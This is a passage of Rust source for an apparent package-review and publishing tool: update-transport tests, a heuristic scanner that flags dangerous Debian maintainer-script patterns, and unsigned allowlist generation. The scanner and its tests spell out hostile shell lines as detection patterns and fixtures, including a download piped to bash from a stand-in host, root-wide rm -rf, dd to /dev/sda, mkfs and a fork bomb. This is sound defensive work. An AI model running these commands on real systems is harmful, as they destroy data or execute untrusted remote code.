        let mut t = UrlTransport {
            base: "https://u.example".to_string(),
            http: Box::new(FakeHttp { bodies }),
        };
        // Manifest says 100 bytes, server sent 5.
        let a = artifact("app.deb", 100);
        assert!(t.fetch_artifact("stable", &a).is_err());
        // Manifest says 4 bytes, server sent 5 (over the read limit).
        let a = artifact("app.deb", 4);
        assert!(t.fetch_artifact("stable", &a).is_err());
    }

    #[test]
    fn build_transport_requires_exactly_one_source() {
        let base = UpdateArgs {
            channel: "stable".to_string(),
            transport_dir: None,
            transport_url: None,
            update_keys: PathBuf::from("k.json"),
            threshold: 1,
            keyring: PathBuf::from("keyring.json"),
            state: PathBuf::from("state.json"),
            audit_log: PathBuf::from("audit.jsonl"),
            update_state_dir: PathBuf::from("state-dir"),
            dry_run: true,
        };
        assert!(build_transport(&base).is_err());
        let both = UpdateArgs {
            transport_dir: Some(PathBuf::from("/tmp/t")),
            transport_url: Some("https://u.example".to_string()),
            ..base
        };
        assert!(build_transport(&both).is_err());
        let bad_url = UpdateArgs {
            transport_url: Some("http://u.example".to_string()),
            ..both
        };
        assert!(build_transport(&bad_url).is_err());
        let url = UpdateArgs {
            transport_dir: None,
            ..bad_url.clone_with("https://u.example".to_string())
        };
        assert!(build_transport(&url).is_ok());
    }

    impl UpdateArgs {
        fn clone_with(&self, url: String) -> Self {
            UpdateArgs {
                channel: self.channel.clone(),
                transport_dir: self.transport_dir.clone(),
                transport_url: Some(url),
                update_keys: self.update_keys.clone(),
                threshold: self.threshold,
                keyring: self.keyring.clone(),
                state: self.state.clone(),
                audit_log: self.audit_log.clone(),
                update_state_dir: self.update_state_dir.clone(),
                dry_run: self.dry_run,
            }
        }
    }

    /// Serves each queued response on a one-shot 127.0.0.1 listener and
    /// returns its base URL. Test-only: production code never accepts http://
    /// (validate_transport_url), this exists to exercise UreqGet's plumbing.
    fn serve_once(responses: Vec<&'static str>) -> String {
        let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let port = listener.local_addr().unwrap().port();
        std::thread::spawn(move || {
            for resp in responses {
                let (mut sock, _) = listener.accept().unwrap();
                let mut req = [0u8; 1024];
                let _ = sock.read(&mut req);
                use std::io::Write as _;
                sock.write_all(resp.as_bytes()).unwrap();
            }
        });
        format!("http://127.0.0.1:{port}")
    }

    #[test]
    fn ureq_get_reads_body_and_rejects_redirect() {
        let base = serve_once(vec![
            "HTTP/1.1 302 Found\r\nLocation: /other\r\nContent-Length: 0\r\nConnection: close\r\n\r\n",
            "HTTP/1.1 200 OK\r\nContent-Length: 5\r\nConnection: close\r\n\r\nhello",
        ]);
        let mut http = UreqGet::new();
        // Redirects are never followed.
        assert!(http.get(&base, 1024).is_err());
        // A plain 200 body is returned.
        assert_eq!(http.get(&base, 1024).unwrap(), b"hello");
    }
}

/// One maintainer-script finding. Findings name the pattern and the line
/// number, never the script content (log hygiene, docs/THREAT_MODEL.md).
#[derive(Debug)]
struct ScriptFinding {
    script: String,
    line: usize,
    fail: bool,
    pattern: &'static str,
}

/// What a pre-review check established.
#[derive(Debug)]
struct ReviewReport {
    package: String,
    version: String,
    scripts_scanned: usize,
    findings: Vec<ScriptFinding>,
}

/// True when a compacted (whitespace-free) line pipes into a shell. The match
/// must end at a non-letter boundary so `| sha256sum -c` is not a pipe to sh.
fn piped_to_shell(compact: &str) -> bool {
    for pat in ["|sh", "|bash", "|zsh", "|dash", "|/bin/sh", "|/bin/bash"] {
        let mut start = 0;
        while let Some(i) = compact[start..].find(pat) {
            let after = start + i + pat.len();
            match compact.as_bytes().get(after) {
                None => return true,
                Some(b) if !b.is_ascii_alphanumeric() => return true,
                _ => {}
            }
            start = after;
        }
    }
    false
}

/// True when a compacted line runs `rm` with recursive+force flags rooted at
/// / (end of line, glob, or command separator right after the slash).
fn has_root_rm(compact: &str) -> bool {
    for pat in [
        "rm-rf/",
        "rm-fr/",
        "rm-r-f/",
        "rm-f-r/",
        "rm--recursive--force/",
    ] {
        let mut start = 0;
        while let Some(i) = compact[start..].find(pat) {
            let after = start + i + pat.len();
            match compact.as_bytes().get(after) {
                None => return true,
                Some(b) if b"*|;&)\"\'`".contains(b) => return true,
                _ => {}
            }
            start = after;
        }
    }
    false
}

/// True when a compacted line chmods / recursively world-writable.
fn has_root_chmod(compact: &str) -> bool {
    for pat in ["chmod-R777/", "chmod-Rf777/", "chmod-fR777/"] {
        let mut start = 0;
        while let Some(i) = compact[start..].find(pat) {
            let after = start + i + pat.len();
            match compact.as_bytes().get(after) {
                None => return true,
                Some(b) if b"*;&)\"\'`".contains(b) => return true,
                _ => {}
            }
            start = after;
        }
    }
    false
}

/// Heuristic scan of one maintainer script. FAIL findings are install-time
/// code-execution red flags: a download piped to a shell, recursive delete or
/// world-writable chmod rooted at /, raw writes to block devices, mkfs, fork
/// bombs. WARN findings deserve a human look: network fetches, remote URLs,
/// sudo in a script that already runs as root. These are heuristics, not
/// detection: a clean scan says nothing about what the installed binary does
/// at runtime. See docs/STORE_REVIEW_MODEL.md section 5.
fn scan_script(name: &str, body: &[u8]) -> Result<Vec<ScriptFinding>, String> {
    let text = std::str::from_utf8(body)
        .map_err(|_| format!("maintainer script {name} is not valid UTF-8 text"))?;
    let mut out = Vec::new();
    let mut finding = |line: usize, fail: bool, pattern: &'static str| {
        out.push(ScriptFinding {
            script: name.to_string(),
            line,
            fail,
            pattern,
        });
    };
    for (idx, line) in text.lines().enumerate() {
        let n = idx + 1;
        let compact: String = line.chars().filter(|c| !c.is_whitespace()).collect();
        let fetches = line.contains("curl") || line.contains("wget") || compact.contains("base64");
        if fetches && piped_to_shell(&compact) {
            finding(n, true, "download piped to a shell");
        }
        if has_root_rm(&compact) {
            finding(n, true, "recursive forced delete rooted at /");
        }
        if compact.contains("of=/dev/") {
            finding(n, true, "raw write to a block device");
        }
        if compact.contains("mkfs") {
            finding(n, true, "filesystem format command");
        }
        if compact.contains(":(){") {
            finding(n, true, "fork bomb");
        }
        if has_root_chmod(&compact) {
            finding(n, true, "recursive world-writable chmod rooted at /");
        }
        if line.contains("curl") || line.contains("wget") {
            finding(n, false, "network fetch in a maintainer script");
        } else if line.contains("http://") || line.contains("https://") {
            finding(n, false, "remote URL in a maintainer script");
        }
        if compact.starts_with("sudo") || compact.contains(";sudo") || compact.contains("|sudo") {
            finding(n, false, "sudo in a script that already runs as root");
        }
    }
    Ok(out)
}

/// The pure core of `review-check`, over the .deb's bytes. Err is a review
/// failure (hash mismatch, identity mismatch, unreadable or unsafe package);
/// Ok carries the identity and any maintainer-script findings, and any FAIL
/// finding fails the review.
fn run_review_check(
    deb: &[u8],
    expected_sha256: &str,
    name: &str,
    version: Option<&str>,
) -> Result<ReviewReport, String> {
    pos_gate::names::validate_package_name(name)
        .map_err(|e| format!("package name fails the gate's safe-name rules: {e}"))?;
    if let Some(v) = version {
        if v.is_empty() || v.bytes().any(|b| b.is_ascii_control() || b == b' ') {
            return Err(
                "version is empty or contains whitespace or control characters".to_string(),
            );
        }
    }
    if expected_sha256.len() != 64
        || !expected_sha256
            .bytes()
            .all(|b| b.is_ascii_hexdigit() && !b.is_ascii_uppercase())
    {
        return Err("submission hash must be 64 lowercase hex characters".to_string());
    }
    use sha2::Digest as _;
    let actual_hex = hex::encode(sha2::Sha256::digest(deb));
    if actual_hex != expected_sha256 {
        return Err(format!(
            "hash mismatch: the submission binds {expected_sha256} but the file is {actual_hex}"
        ));
    }
    let contents = pos_gate::deb_identity::read_control_contents(&mut std::io::Cursor::new(deb))
        .map_err(|e| format!("cannot read the package's control archive: {e}"))?;
    pos_gate::deb_identity::check_identity(&contents.identity, name, version)
        .map_err(|e| format!("package identity mismatch: {e}"))?;
    let mut findings = Vec::new();
    for script in &contents.scripts {
        findings.extend(scan_script(&script.name, &script.body)?);
    }
    Ok(ReviewReport {
        package: contents.identity.package,
        version: contents.identity.version,
        scripts_scanned: contents.scripts.len(),
        findings,
    })
}

fn cmd_review_check(
    deb: PathBuf,
    sha256: String,
    name: String,
    version: Option<String>,
) -> ExitCode {
    let bytes = match std::fs::read(&deb) {
        Ok(b) => b,
        Err(e) => {
            eprintln!("error: cannot read {}: {e}", deb.display());
            return ExitCode::from(4);
        }
    };
    match run_review_check(&bytes, &sha256, &name, version.as_deref()) {
        Err(msg) => {
            eprintln!("review-check FAILED: {msg}");
            ExitCode::from(2)
        }
        Ok(report) => {
            println!(
                "package {} {}: hash bound, identity matches, {} maintainer script(s) scanned",
                report.package, report.version, report.scripts_scanned
            );
            let mut failed = false;
            for f in &report.findings {
                let level = if f.fail { "FAIL" } else { "WARN" };
                println!("{level}: {} line {}: {}", f.script, f.line, f.pattern);
                failed |= f.fail;
            }
            if failed {
                eprintln!("review-check FAILED: maintainer-script findings above");
                ExitCode::from(2)
            } else {
                println!("review-check passed");
                ExitCode::SUCCESS
            }
        }
    }
}

#[cfg(test)]
mod review_check_tests {
    use super::*;

    /// A minimal .deb whose control archive carries the given maintainer
    /// scripts. Test fixture builder, modeled on build_minimal_deb.
    fn build_deb_with_scripts(package: &str, version: &str, scripts: &[(&str, &str)]) -> Vec<u8> {
        fn tar_header(name: &str, size: usize) -> [u8; 512] {
            let mut h = [0u8; 512];
            h[..name.len()].copy_from_slice(name.as_bytes());
            h[100..108].copy_from_slice(b"0000644\0");
            h[124..136].copy_from_slice(format!("{:011o}\0", size).as_bytes());
            h[156] = b'0';
            h
        }
        let control = format!("Package: {package}\nVersion: {version}\nArchitecture: all\n");
        let mut tar = Vec::new();
        let push = |tar: &mut Vec<u8>, name: &str, data: &[u8]| {
            tar.extend_from_slice(&tar_header(name, data.len()));
            tar.extend_from_slice(data);
            tar.resize(tar.len().div_ceil(512) * 512, 0);
        };
        push(&mut tar, "./control", control.as_bytes());
        for (n, body) in scripts {
            push(&mut tar, &format!("./{n}"), body.as_bytes());
        }
        tar.resize(tar.len() + 1024, 0);
        let member = |name: &str, data: &[u8]| {
            let mut v = format!(
                "{:<16}{:<12}{:<6}{:<6}{:<8}{:<10}`\n",
                format!("{name}/"),
                0,
                0,
                0,
                "100644",
                data.len()
            )
            .into_bytes();
            v.extend_from_slice(data);
            if data.len() % 2 == 1 {
                v.push(b'\n');
            }
            v
        };
        let mut deb = b"!<arch>\n".to_vec();
        deb.extend(member("debian-binary", b"2.0\n"));
        deb.extend(member("control.tar", &tar));
        deb.extend(member("data.tar.xz", b"placeholder"));
        deb
    }

    fn sha256_hex(bytes: &[u8]) -> String {
        use sha2::Digest as _;
        hex::encode(sha2::Sha256::digest(bytes))
    }

    #[test]
    fn clean_package_passes() {
        let deb = build_deb_with_scripts(
            "hello-app",
            "1.0",
            &[("postinst", "#!/bin/sh\nset -e\nldconfig\n")],
        );
        let r = run_review_check(&deb, &sha256_hex(&deb), "hello-app", Some("1.0")).unwrap();
        assert_eq!(r.package, "hello-app");
        assert_eq!(r.scripts_scanned, 1);
        assert!(r.findings.is_empty());
    }

    #[test]
    fn hash_mismatch_fails() {
        let deb = build_deb_with_scripts("hello-app", "1.0", &[]);
        let other = build_deb_with_scripts("hello-app", "1.1", &[]);
        let err =
            run_review_check(&deb, &sha256_hex(&other), "hello-app", Some("1.0")).unwrap_err();
        assert!(err.contains("hash mismatch"));
    }

    #[test]
    fn identity_and_name_rule_failures() {
        let deb = build_deb_with_scripts("hello-app", "1.0", &[]);
        let h = sha256_hex(&deb);
        assert!(run_review_check(&deb, &h, "other-app", Some("1.0")).is_err());
        assert!(run_review_check(&deb, &h, "hello-app", Some("2.0")).is_err());
        assert!(run_review_check(&deb, &h, "bad;name", None).is_err());
        assert!(run_review_check(&deb, "zz", "hello-app", None).is_err());
    }

    #[test]
    fn pipe_to_shell_fails_but_checksum_pipe_does_not() {
        let evil = build_deb_with_scripts(
            "evil-app",
            "1.0",
            &[(
                "postinst",
                "#!/bin/sh\ncurl https://x.example/p.sh | bash\n",
            )],
        );
        let r = run_review_check(&evil, &sha256_hex(&evil), "evil-app", None).unwrap();
        assert!(r.findings.iter().any(|f| f.fail));

        let careful = build_deb_with_scripts(
            "careful-app",
            "1.0",
            &[(
                "postinst",
                "#!/bin/sh\ncurl -O https://x.example/sums\nsha256sum -c sums\n",
            )],
        );
        let r = run_review_check(&careful, &sha256_hex(&careful), "careful-app", None).unwrap();
        assert!(!r.findings.iter().any(|f| f.fail));
        assert!(r.findings.iter().any(|f| !f.fail)); // the fetch itself warns
    }

    #[test]
    fn destructive_patterns_fail() {
        for (label, body) in [
            ("rm-root", "#!/bin/sh\nrm -rf / \n"),
            ("rm-root-star", "#!/bin/sh\nrm -rf /*\n"),
            ("rm-subdir-ok-but-dd", "#!/bin/sh\ndd if=x of=/dev/sda\n"),
            ("mkfs", "#!/bin/sh\nmkfs.ext4 /dev/sda1\n"),
            ("forkbomb", "#!/bin/sh\n:(){ :|:& };:\n"),
            ("chmod", "#!/bin/sh\nchmod -R 777 / \n"),
        ] {
            let deb = build_deb_with_scripts("bad-app", "1.0", &[("postinst", body)]);
            let r = run_review_check(&deb, &sha256_hex(&deb), "bad-app", None)
                .unwrap_or_else(|e| panic!("{label}: unexpected Err: {e}"));
            assert!(r.findings.iter().any(|f| f.fail), "{label}");
        }
        // A recursive delete of a real subdirectory is fine.
        let ok = build_deb_with_scripts(
            "ok-app",
            "1.0",
            &[("prerm", "#!/bin/sh\nrm -rf /var/lib/ok-app\n")],
        );
        let r = run_review_check(&ok, &sha256_hex(&ok), "ok-app", None).unwrap();
        assert!(!r.findings.iter().any(|f| f.fail));
    }

    #[test]
    fn non_utf8_script_fails() {
        let deb =
            build_deb_with_scripts_raw("bin-app", "1.0", &[("postinst", &[0xff, 0xfe, 0x41])]);
        let err = run_review_check(&deb, &sha256_hex(&deb), "bin-app", None).unwrap_err();
        assert!(err.contains("UTF-8"));
    }

    fn build_deb_with_scripts_raw(
        package: &str,
        version: &str,
        scripts: &[(&str, &[u8])],
    ) -> Vec<u8> {
        fn tar_header(name: &str, size: usize) -> [u8; 512] {
            let mut h = [0u8; 512];
            h[..name.len()].copy_from_slice(name.as_bytes());
            h[100..108].copy_from_slice(b"0000644\0");
            h[124..136].copy_from_slice(format!("{:011o}\0", size).as_bytes());
            h[156] = b'0';
            h
        }
        let control = format!("Package: {package}\nVersion: {version}\nArchitecture: all\n");
        let mut tar = Vec::new();
        let push = |tar: &mut Vec<u8>, name: &str, data: &[u8]| {
            tar.extend_from_slice(&tar_header(name, data.len()));
            tar.extend_from_slice(data);
            tar.resize(tar.len().div_ceil(512) * 512, 0);
        };
        push(&mut tar, "./control", control.as_bytes());
        for (n, body) in scripts {
            push(&mut tar, &format!("./{n}"), body);
        }
        tar.resize(tar.len() + 1024, 0);
        let member = |name: &str, data: &[u8]| {
            let mut v = format!(
                "{:<16}{:<12}{:<6}{:<6}{:<8}{:<10}`\n",
                format!("{name}/"),
                0,
                0,
                0,
                "100644",
                data.len()
            )
            .into_bytes();
            v.extend_from_slice(data);
            if data.len() % 2 == 1 {
                v.push(b'\n');
            }
            v
        };
        let mut deb = b"!<arch>\n".to_vec();
        deb.extend(member("debian-binary", b"2.0\n"));
        deb.extend(member("control.tar", &tar));
        deb.extend(member("data.tar.xz", b"placeholder"));
        deb
    }

    #[test]
    fn duplicate_script_first_wins_and_sudo_warns() {
        let deb = build_deb_with_scripts(
            "sudo-app",
            "1.0",
            &[("preinst", "#!/bin/sh\nsudo -u x true\n")],
        );
        let r = run_review_check(&deb, &sha256_hex(&deb), "sudo-app", None).unwrap();
        assert!(r.findings.iter().all(|f| !f.fail));
        assert_eq!(r.scripts_scanned, 1);
    }
}

/// The unsigned v2 allowlist authorizing exactly one approved package, plus
/// the artifact base name for the release pair. Re-hashes the artifact and
/// refuses on any mismatch with the approved submission hash: this is the
/// anti-swap step between review and publish (STORE_REVIEW_MODEL threat 2).
/// Pure; the cmd writes the files. The signature stays empty: signing is the
/// owner's offline step (`pos-cli sign`) and this tool never sees the key.
fn build_publish_doc(
    deb: &[u8],
    expected_sha256: &str,
    keyring: &pos_gate::Keyring,
    key_id: &str,
    sequence: u64,
    now: i64,
    lifetime_secs: i64,
) -> Result<(String, pos_gate::allowlist_v2::V2Allowlist), String> {
    if expected_sha256.len() != 64
        || !expected_sha256
            .bytes()
            .all(|b| b.is_ascii_hexdigit() && !b.is_ascii_uppercase())
    {
        return Err("submission hash must be 64 lowercase hex characters".to_string());
    }
    use sha2::Digest as _;
    let actual = hex::encode(sha2::Sha256::digest(deb));
    if actual != expected_sha256 {
        return Err(format!(
            "hash mismatch: the approved submission binds {expected_sha256} but the artifact is {actual}; refusing to publish"
        ));
    }
    let id = pos_gate::deb_identity::read_identity(&mut std::io::Cursor::new(deb))
        .map_err(|e| format!("cannot read the package's control archive: {e}"))?;
    pos_gate::names::validate_package_name(&id.package)
        .map_err(|e| format!("package name fails the gate's safe-name rules: {e}"))?;
    if id.version.is_empty()
        || !id
            .version
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || b".+~-_".contains(&b))
    {
        return Err(format!(
            "version {:?} is not usable in a release file name",
            id.version
        ));
    }
    let key = keyring
        .keys
        .iter()
        .find(|k| k.key_id == key_id)
        .ok_or_else(|| format!("key id {key_id} is not in the keyring"))?;
    let expires_at = now
        .checked_add(lifetime_secs)
        .ok_or("expiry timestamp overflows")?;
    let base = format!("{}-{}", id.package, id.version);
    let doc = pos_gate::allowlist_v2::V2Allowlist {
        format: "passaura-allowlist".to_string(),
        version: 2,
        sequence,
        issued_at: now,
        expires_at,
        signed_by: key.key_id.clone(),
        keyring: pos_gate::allowlist_v2::V2Keyring {
            keys: vec![pos_gate::allowlist_v2::V2Key {
                key_id: key.key_id.clone(),
                public_key_hex: key.public_key_hex.clone(),
                valid_from: 0,
                valid_until: expires_at,
                retired: false,
            }],
        },
        entries: vec![pos_gate::allowlist_v2::V2Entry {
            name: id.package.clone(),
            version: Some(id.version.clone()),
            sha256: actual,
        }],
        signature_hex: String::new(),
    };
    Ok((base, doc))
}

fn cmd_store_publish(
    deb: PathBuf,
    submission_sha256: String,
    keyring: PathBuf,
    key_id: String,
    sequence: u64,
    lifetime_days: u64,
    out: PathBuf,
) -> ExitCode {
    let run = || -> Result<(), String> {
        let bytes =
            std::fs::read(&deb).map_err(|e| format!("cannot read {}: {e}", deb.display()))?;
        let kr = pos_gate::Keyring::from_json(&read_json(&keyring)?).map_err(|e| e.to_string())?;
        let lifetime_secs = i64::try_from(lifetime_days)
            .map_err(|_| "lifetime too large")?
            .checked_mul(86_400)
            .ok_or("lifetime too large")?;
        let (base, doc) = build_publish_doc(
            &bytes,
            &submission_sha256,
            &kr,
            &key_id,
            sequence,
            now_secs() as i64,
            lifetime_secs,
        )?;
        std::fs::create_dir_all(&out)
            .map_err(|e| format!("cannot create {}: {e}", out.display()))?;
        let deb_out = out.join(format!("{base}.deb"));
        let al_out = out.join(format!("{base}.allowlist.json"));
        write_new_file(&deb_out, &bytes)?;
        write_new_file(
            &al_out,
            &serde_json::to_vec_pretty(&doc).map_err(|e| e.to_string())?,
        )?;
        println!("hash verified against the approved submission; wrote the release pair:");
        println!("  {}", deb_out.display());
        println!("  {}", al_out.display());
        println!("the allowlist is UNSIGNED. Next: the owner signs it offline");
        println!("(pos-cli sign) with the release key, then the signed pair goes into");
        println!("the update transport directory. This tool never sees the key.");
        Ok(())
    };
    match run() {
        Ok(()) => ExitCode::SUCCESS,
        Err(e) => {
            eprintln!("error: {e}");
            ExitCode::from(2)
        }
    }
}

#[cfg(test)]
mod store_publish_tests {
    use super::*;
    use sha2::Digest as _;

    fn test_keyring() -> (pos_gate::Keyring, ed25519_dalek::SigningKey) {
        let sk = ed25519_dalek::SigningKey::from_bytes(&[7u8; 32]);
        let pk = hex::encode(sk.verifying_key().to_bytes());
        let kid = pos_gate::allowlist_v2::derive_key_id(&pk);
        (
            pos_gate::Keyring {
                keys: vec![pos_gate::allowlist::KeyEntry {
                    key_id: kid,
                    public_key_hex: pk,
                }],
            },
            sk,
        )
    }

    #[test]
    fn doc_is_correct_and_verifies_once_signed() {
        let deb = pos_gate::deb_identity::build_minimal_deb("hello-app", "1.0");
        let sha = hex::encode(sha2::Sha256::digest(&deb));
        let (kr, sk) = test_keyring();
        let kid = kr.keys[0].key_id.clone();
        let now = now_secs() as i64;
        let (base, mut doc) =
            build_publish_doc(&deb, &sha, &kr, &kid, 5, now, 30 * 86_400).unwrap();
        assert_eq!(base, "hello-app-1.0");
        assert_eq!(doc.sequence, 5);
        assert_eq!(doc.entries.len(), 1);
        assert_eq!(doc.entries[0].name, "hello-app");
        assert_eq!(doc.entries[0].sha256, sha);
        assert_eq!(doc.signed_by, kid);
        // Unsigned, it verifies nothing.
        assert!(pos_gate::allowlist_v2::verify_v2_trusted(&doc, &kr, now, None).is_err());
        // Signed the way cmd_sign signs, it verifies against the trusted keyring.
        use ed25519_dalek::Signer as _;
        let payload = pos_gate::allowlist_v2::canonical_payload_bytes(&doc).unwrap();
        doc.signature_hex = hex::encode(sk.sign(&payload).to_bytes());
        pos_gate::allowlist_v2::verify_v2_trusted(&doc, &kr, now, None).unwrap();
    }

    #[test]
    fn anti_swap_and_bad_inputs_fail() {
        let deb = pos_gate::deb_identity::build_minimal_deb("hello-app", "1.0");
        let other = pos_gate::deb_identity::build_minimal_deb("hello-app", "1.1");
        let sha = hex::encode(sha2::Sha256::digest(&deb));
        let wrong = hex::encode(sha2::Sha256::digest(&other));
        let (kr, _sk) = test_keyring();
        let kid = kr.keys[0].key_id.clone();
        let now = now_secs() as i64;
        let err = build_publish_doc(&deb, &wrong, &kr, &kid, 1, now, 100).unwrap_err();
        assert!(err.contains("hash mismatch"));
        assert!(build_publish_doc(&deb, &sha, &kr, "nosuchkey", 1, now, 100).is_err());
        assert!(build_publish_doc(&deb, "zz", &kr, &kid, 1, now, 100).is_err());
    }

    #[test]
    fn cmd_writes_pair_and_never_overwrites() {
        let dir = tempfile::tempdir().unwrap();
        let deb = pos_gate::deb_identity::build_minimal_deb("hello-app", "1.0");
        let sha = hex::encode(sha2::Sha256::digest(&deb));
        let (kr, _sk) = test_keyring();
        let deb_path = dir.path().join("sub.deb");
        std::fs::write(&deb_path, &deb).unwrap();
        let kr_path = dir.path().join("kr.json");
        std::fs::write(&kr_path, serde_json::to_vec(&kr).unwrap()).unwrap();
        let out = dir.path().join("rel");
        let code = cmd_store_publish(
            deb_path.clone(),
            sha.clone(),
            kr_path.clone(),
            kr.keys[0].key_id.clone(),
            1,
            30,
            out.clone(),
        );
        assert_eq!(code, ExitCode::SUCCESS);
        assert!(out.join("hello-app-1.0.deb").exists());
        assert!(out.join("hello-app-1.0.allowlist.json").exists());
        let code = cmd_store_publish(
            deb_path,
            sha,
            kr_path,
            kr.keys[0].key_id.clone(),
            1,
            30,
            out,
        );
        assert_eq!(code, ExitCode::from(2)); // existing pair is never overwritten
    }
}
